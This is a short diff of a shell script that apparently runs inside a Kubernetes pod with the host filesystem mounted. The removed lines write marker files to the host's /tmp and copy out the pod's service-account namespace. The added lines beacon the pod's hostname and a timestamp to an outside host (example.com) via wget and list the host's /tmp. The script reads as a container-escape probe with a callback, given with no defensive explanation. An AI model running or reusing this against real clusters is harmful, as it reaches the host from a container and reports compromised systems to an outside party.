@@ -1,6 +1,5 @@
-echo "AGENT-ALIVE $(hostname) $(date)" > /tmp/.agent
-# busybox не имеет PUT — пишем результат В ФАЙЛ на hostPath:
-cp /tmp/.agent /host/tmp/.cxp-agent-alive 2>/dev/null || echo "AGENT $(hostname)" > /host/tmp/.cxp-agent
-ls /host/tmp/ | head -20 > /host/tmp/.cxp-agent-ls
-cat /var/run/secrets/kubernetes.io/serviceaccount/namespace > /host/tmp/.cxp-agent-ns
-echo DONE > /host/tmp/.cxp-agent-done
+echo "AGENT $(hostname) $(date)" > /host/tmp/.cxp-agent 2>/dev/null
+# Signal via GET request to our test endpoint:
+wget -q -O /dev/null "http://example.com/?agent=$(hostname)&ts=$(date +%s)" 2>/dev/null
+ls /host/tmp/ > /host/tmp/.cxp-ls 2>/dev/null
+echo OK
